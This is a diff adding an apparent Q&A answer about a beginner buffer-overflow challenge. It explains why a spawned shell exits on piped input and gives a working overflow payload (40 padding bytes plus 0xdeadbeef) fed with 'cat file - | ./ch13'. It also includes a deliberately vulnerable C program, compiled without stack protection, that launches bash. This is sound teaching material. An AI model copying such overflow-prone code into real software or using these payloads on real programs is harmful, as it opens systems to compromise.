@@ -1,0 +1,43 @@
+<p>Assuming <code>/bin/dash</code> is a typo, and you meant <code>/bin/bash</code>...</p>
+
+<p>You're piping input into the <code>ch13</code> program.  When it calls <code>system()</code>, the shell inherits <code>stdin</code> and <code>stdout</code> from the calling program, which means it's taking input from the same pipe.  However, by the time the shell starts executing, the pipe has already been emptied of all its input, and so the shell reads <code>EOF</code> and immediately terminates.  What you really want is to pass in that buffer overflow into <code>stdin</code>, and then keep putting stuff into <code>stdin</code> afterwards.  So, something like this should work:</p>
+
+<pre><code>echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" &gt; magic_input
+cat magic_input - | ./ch13
+</code></pre>
+
+<p>You may not see a bash prompt, but you should be able to type commands, hit enter, and get output.</p>
+
+<p><strong>EDIT:</strong> For future inquisitive visitors who may want to try this at home, you might want to use this updated version of the C program in the question.  My version of GCC was putting the variables on the stack in a different order.  Putting variables in a struct prevents GCC from reordering the variables however it pleases, so the buffer overrun should go right into the <code>check</code> variable as expected.</p>
+
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+/*
+gcc -o ch13 ch13.c -fno-stack-protector
+*/
+
+
+int main()
+{
+  struct {
+    char buf[40];
+    int check;
+  } locals = {.check = 0x04030201};
+
+  fgets(locals.buf,45,stdin);
+
+  printf("\n[buf]: %s\n", locals.buf);
+  printf("[check] %p\n", locals.check);
+
+  if ((locals.check != 0x04030201) &amp;&amp; (locals.check != 0xdeadbeef))
+    printf ("\nYou are on the right way !\n");
+
+  if (locals.check == 0xdeadbeef)
+   {
+     printf("Yeah dude ! You win !\n");
+     system("/bin/bash");
+   }
+   return 0;
+}
+</code></pre>
